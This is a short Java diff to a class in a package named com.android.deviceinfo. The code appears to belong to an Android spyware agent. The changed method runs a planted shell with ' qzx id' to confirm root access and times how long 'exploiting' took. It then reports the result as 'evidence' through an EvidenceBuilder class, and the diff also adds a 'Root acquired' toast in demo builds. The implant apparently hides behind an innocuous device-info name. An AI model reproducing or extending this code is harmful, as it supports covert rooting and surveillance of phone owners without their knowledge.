@@ -27,7 +27,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -152,6 +152,7 @@ public class PackageInfo {
 				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
 				String stdout = p.getStdout();
 				if (stdout.startsWith("uid=0")) {
+					
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 
@@ -159,21 +160,28 @@ public class PackageInfo {
 						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
 
 						if (!sentInfo) {
-							EvidenceReference.info("Root: " + Root.method + " time: " + diff + "s");
+							EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
+							if(Cfg.DEMO){
+								Status.self().makeToast("Root acquired");
+							}
 						}
-						sentInfo = true;
+						
+					}else{
+						if (!sentInfo) {
+							EvidenceBuilder.info("Root");
+						}
 					}
 
 					isRoot = true;
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
-						if (!sentInfo) {
-							EvidenceReference.info("Root: NO");
-						}
-						sentInfo = true;
+					}
+					if (!sentInfo) {
+						EvidenceBuilder.info("Root: NO");
 					}
 				}
+				sentInfo = true;
 			}
 		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
